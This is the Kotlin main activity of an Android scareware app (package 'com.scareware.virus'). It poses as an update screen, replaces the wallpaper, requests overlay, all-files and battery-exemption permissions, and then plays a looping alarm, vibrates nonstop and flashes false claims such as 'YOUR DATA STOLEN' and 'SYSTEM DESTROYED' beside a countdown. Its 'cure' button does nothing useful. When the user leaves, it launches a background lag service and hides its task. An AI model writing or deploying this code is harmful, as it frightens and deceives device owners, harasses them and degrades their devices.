package com.scareware.virus

import android.Manifest
import android.app.WallpaperManager
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private val handler = Handler(Looper.getMainLooper())
    private var glitchRunnable: Runnable? = null
    private var scareStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                )

        setContentView(R.layout.activity_main)

        // Wallpaper
        try {
            val wm = WallpaperManager.getInstance(this)
            val bmp = BitmapFactory.decodeResource(resources, R.drawable.scary_face)
            if (bmp != null) wm.setBitmap(bmp)
        } catch (_: Exception) {}

        // Quyền overlay
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            }
        } catch (_: Exception) {}

        // Quyền All files (để file rác hiện ngoài Downloads)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 100)
                }
            }
        } catch (_: Exception) {}

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            }
        } catch (_: Exception) {}

        handler.postDelayed({ showScarePhase() }, 4000)
    }

    private fun showScarePhase() {
        if (scareStarted) return
        scareStarted = true

        findViewById<LinearLayout>(R.id.updateScreen).visibility = View.GONE
        findViewById<View>(R.id.scareScreen).visibility = View.VISIBLE

        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.start()
        } catch (_: Exception) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(this@MainActivity, uri)
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }

        try {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 500, 100, 500, 100, 800), 0))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 500, 100, 500, 100, 800), 0)
            }
        } catch (_: Exception) {}

        startGlitch()
        cycleMessages()
        startTimer()

        findViewById<Button>(R.id.cureButton).setOnClickListener {
            val cure = findViewById<TextView>(R.id.cureText)
            cure.visibility = View.VISIBLE
            cure.text = "إزالة الفيروس... لن يتوقف إلا بالإلغاء التثبيت"
            handler.postDelayed({ startLagAndHide() }, 3000)
        }

        handler.postDelayed({ startLagAndHide() }, 20000)
    }

    private fun startGlitch() {
        val root = findViewById<View>(R.id.rootLayout)
        val img = findViewById<ImageView>(R.id.scaryImage)
        glitchRunnable = object : Runnable {
            override fun run() {
                val colors = intArrayOf(Color.BLACK, Color.RED, Color.WHITE, Color.YELLOW, Color.rgb(180, 0, 0))
                root.setBackgroundColor(colors[Random.nextInt(colors.size)])
                val anim = AlphaAnimation(0.1f, 1f)
                anim.duration = 40
                anim.repeatMode = Animation.REVERSE
                anim.repeatCount = 5
                img.startAnimation(anim)
                img.scaleX = 0.95f + Random.nextFloat() * 0.12f
                img.scaleY = 0.95f + Random.nextFloat() * 0.12f
                handler.postDelayed(this, Random.nextLong(50, 180))
            }
        }
        handler.post(glitchRunnable!!)
    }

    private fun cycleMessages() {
        val messages = listOf(
            "⚠ تم اختراق جهازك ⚠",
            "⚠ YOUR DATA STOLEN ⚠",
            "⚠ 您的数据已被窃取 ⚠",
            "⚠ تم سرقة بياناتك ⚠",
            "⚠ SYSTEM DESTROYED ⚠"
        )
        val tv = findViewById<TextView>(R.id.scareText)
        var i = 0
        handler.post(object : Runnable {
            override fun run() {
                tv.text = messages[i % messages.size]
                i++
                handler.postDelayed(this, 1100)
            }
        })
    }

    private fun startTimer() {
        val tv = findViewById<TextView>(R.id.timerText)
        var sec = 3599
        handler.post(object : Runnable {
            override fun run() {
                tv.text = String.format("الوقت: %02d:%02d", sec / 60, sec % 60)
                if (sec > 0) sec--
                handler.postDelayed(this, 1000)
            }
        })
    }

    private fun startLagAndHide() {
        val svc = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
        else startService(svc)
        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
        mediaPlayer = null
        glitchRunnable?.let { handler.removeCallbacks(it) }
        finishAndRemoveTask()
    }

    override fun onUserLeaveHint() { if (scareStarted) startLagAndHide() }
    override fun onBackPressed() { if (scareStarted) startLagAndHide() else super.onBackPressed() }

    override fun onDestroy() {
        try {
            val svc = Intent(this, LagService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc) else startService(svc)
        } catch (_: Exception) {}
        mediaPlayer?.release()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
